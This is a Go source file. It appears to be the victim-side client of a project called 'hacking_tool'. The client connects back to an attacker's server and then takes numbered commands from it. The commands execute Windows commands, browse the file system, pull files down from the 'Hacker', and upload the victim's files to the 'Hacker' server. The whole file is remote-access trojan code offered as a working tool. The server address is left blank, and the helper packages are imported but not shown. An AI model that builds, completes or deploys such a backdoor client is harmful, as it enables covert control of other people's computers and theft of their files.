package main

import (
	"bufio"
	"fmt"
	"log"
	"strings"

	"github.com/didihart/hacking_tool/Victim/commands"
	"github.com/didihart/hacking_tool/Victim/download"
	"github.com/didihart/hacking_tool/Victim/filenavigation"
	"github.com/didihart/hacking_tool/Victim/handler"
	"github.com/didihart/hacking_tool/Victim/upload"
)

func DisplayError(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	ServerIP := ""
	Port := ""
	connection, err := handler.ConnectWithServer(ServerIP, Port)
	if err != nil {
		log.Fatal(err)
	}
	defer connection.Close()
	fmt.Println("[+] Conneciton established with Server :", connection.RemoteAddr().String())

	reader := bufio.NewReader(connection)

	looper := true

	for looper {

		user_input_raw, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
			continue
		}

		user_input := strings.TrimSuffix(user_input_raw, "\n")

		switch {
		case user_input == "1":
			fmt.Println("[+] Executing Commands on windows")
			err := commands.ExecuteCommandWindows(connection)
			DisplayError(err)

		case user_input == "2":
			fmt.Println("[+] File system Naviagtion")

			err = filenavigation.NavigateSystem(connection)
			DisplayError(err)

		case user_input == "3":
			fmt.Println("[+] Downloading File From Server/HAcker")
			err = download.ReadFileContents(connection)
			DisplayError(err)

		case user_input == "4":
			fmt.Println("[+] Uploading File to the Hacker")
			err = upload.UploadToHackerServer(connection)

			DisplayError(err)
		case user_input == "0":
			fmt.Println("[-] Exiting the windows program")
			looper = false
		default:
			fmt.Println("[-] Invalid input , try agian")
		}

	}

}
